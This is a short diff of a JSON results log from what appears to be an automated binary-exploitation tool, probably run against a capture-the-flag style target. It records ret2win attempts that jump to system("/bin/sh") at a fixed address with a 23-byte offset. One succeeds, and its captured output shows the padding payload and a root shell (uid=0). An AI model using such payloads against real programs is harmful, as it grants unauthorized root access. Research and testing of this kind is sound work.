@@ -40,14 +40,14 @@
       "desc": "jump to system(\"/bin/sh\") @ 0x401186 off=23 align=0",
       "ok": false,
       "elapsed": 0.32,
-      "tail": ""
+      "tail": "please input\nAAAAAAAAAAAAAAAAAAAAAAA\u0011@\nok,bye!!!\n"
     },
     {
       "strategy": "ret2win",
       "desc": "jump to system(\"/bin/sh\") @ 0x401186 off=23 align=1",
       "ok": true,
-      "elapsed": 0.89,
-      "tail": "PWNED_42\nroot\nuid=0(root) gid=0(root) groups=0(root)\n"
+      "elapsed": 0.86,
+      "tail": "please input\nAAAAAAAAAAAAAAAAAAAAAAA\u0016\u0010@\nok,bye!!!\nPWNED_42\nroot\nuid=0(root) gid=0(root) groups=0(root)\n"
     }
   ],
   "error": ""
